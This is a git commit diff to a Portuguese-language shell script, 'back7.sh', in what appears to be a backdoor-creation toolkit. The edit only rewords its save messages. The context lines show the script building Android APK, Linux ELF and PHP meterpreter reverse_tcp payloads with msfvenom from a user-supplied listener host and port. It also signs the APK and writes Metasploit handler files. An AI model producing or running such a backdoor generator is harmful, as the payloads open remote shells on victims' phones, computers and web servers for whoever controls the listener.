2129de5f06d23cdece103166e1ab83b630a5e056
H7XX <88547689+H7XX@users.noreply.github.com>
2021-08-06 19:59:07 -0300

    Update back7.sh

--- requisitos/creat-backdoor/back7.sh
+++ requisitos/creat-backdoor/back7.sh
@@ -37,7 +37,7 @@ case "$opcao" in
                 read -p "Sua LPORT: " lport2
                 echo "Criando Backdoor..."
                 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost2 LPORT=$lport2 -o $nome2.apk
-		echo "Script salvo em: Ghost007/requisitos/creat-backdoor/$nome2.apk"
+		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome2.apk"
 		d2j-apk-sign $nome2.apk
 		rm $nome2.apk
 		mv $nome2-signed.apk $nome2.apk
@@ -58,7 +58,7 @@ case "$opcao" in
                 read -p "Sua LPORT: " lport3
                 echo "Criando Backdoor..."
                 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost3 LPORT=$lport3 -f elf -o $nome3.elf
-		echo "Script salvo em: Ghost007/requisitos/creat-backdoor/$nome3.elf"
+		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome3.elf"
 		chmod +x $nome3.elf
 		printf "use exploit/multi/handler \n" > handler.rc
 		printf "set payload linux/x86/meterpreter/reverse_tcp \n" >> handler.rc
@@ -77,7 +77,7 @@ case "$opcao" in
                 read -p "Sua LPORT: " lport4
                 echo "Criando Backdoor..."
                 msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost4 LPORT=$lport4 -o $nome4.php
-		echo "Script salvo em: Ghost007/requisitos/creat-backdoor/$nome4.php"
+		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome4.php"
 		chmod +x $nome4.php
                 printf "use exploit/multi/handler \n" > handler.rc
                 printf "set payload php/meterpreter/reverse_tcp \n" >> handler.rc
